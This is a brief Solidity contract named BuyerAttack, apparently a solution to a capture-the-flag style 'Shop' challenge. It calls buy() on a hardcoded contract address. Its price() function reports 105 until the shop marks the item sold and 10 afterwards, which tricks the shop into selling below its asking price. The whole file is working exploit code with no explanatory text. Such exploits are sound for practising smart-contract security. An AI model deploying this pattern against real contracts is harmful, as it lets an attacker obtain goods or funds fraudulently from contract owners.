
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IShop {
  function buy() external;
  function isSold() external returns(bool);
}

contract BuyerAttack {
    bool entered = false;
    
    function callMe() external {
        IShop(0x96f8c6bBD58efBd493B394F000295542B1Efc447).buy();
    }
    
    function price() external returns(uint){
        return IShop(0x96f8c6bBD58efBd493B394F000295542B1Efc447).isSold() ? 10: 105;
    }
    
}